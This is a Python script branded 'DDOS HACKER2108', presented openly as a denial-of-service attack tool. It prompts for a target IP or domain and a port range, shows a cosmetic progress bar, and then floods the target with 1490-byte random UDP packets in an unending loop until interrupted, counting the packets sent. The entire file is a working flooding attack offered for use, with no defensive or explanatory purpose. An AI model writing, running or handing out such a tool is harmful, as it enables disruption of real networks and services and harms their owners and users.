import sys
import os
import time
import socket
import random
import threading
import signal
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS HACKER2108 ")
print("Author   : HACKER2108")
print() # Empty print needs parentheses

target = input("Target (IP or Domain) : ")  # Accept either IP or domain
# Try to resolve domain name to IP if it's not already an IP address
try:
    # Check if input is an IP address
    socket.inet_aton(target)
    ip = target
    print(f"Target IP: {ip}")
except socket.error:
    # If not an IP, treat as domain and resolve
    try:
        ip = socket.gethostbyname(target)
        print(f"Domain: {target}")
        print(f"Resolved IP: {ip}")
    except socket.gaierror:
        print("Invalid domain or IP. Please check and try again.")
        sys.exit(1)

# Support for multiple ports
port_input = input("Port(s) [single port or range (ex: 80 or 80-443)] : ")
ports = []

# Check if it's a port range
if "-" in port_input:
    try:
        start_port, end_port = map(int, port_input.split("-"))
        ports = list(range(start_port, end_port + 1))
        print(f"Attacking ports {start_port} to {end_port} ({len(ports)} ports)")
    except ValueError:
        print("Invalid port range format. Using port 80.")
        ports = [80]
else:
    # Single port
    try:
        ports = [int(port_input)]
        print(f"Attacking port {ports[0]}")
    except ValueError:
        print("Invalid port number. Using port 80.")
        ports = [80]

current_port_index = 0

os.system("clear")
os.system("figlet DDOS HACKER2108")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
# Variable to control the attack
attack_running = True

# Function to handle stopping the attack
def stop_attack(sig, frame):
    global attack_running
    print("\n\nStopping the attack...")
    attack_running = False
    print(f"Attack stopped. Total packets sent: {sent}")
    sys.exit(0)

# Set up the signal handler for Ctrl+C
signal.signal(signal.SIGINT, stop_attack)

print("\nAttack started. Press Ctrl+C to stop the attack.\n")

sent = 0
while attack_running:
     try:
         # Get the current port from the ports list
         current_port = ports[current_port_index]
         
         # Send the packet
         sock.sendto(bytes, (ip, current_port))
         sent = sent + 1
         
         # Move to the next port in the list
         current_port_index = (current_port_index + 1) % len(ports)
         
         # Print status (overwrite the line to avoid flooding the terminal)
         print(f"Sent {sent} packets to {target} ({ip}) through port:{current_port}", end="\r")
         
         # Optional: Add a very small delay to prevent system overload
         # time.sleep(0.001)
     except Exception as e:
         print(f"\nError: {e}")
         stop_attack(None, None)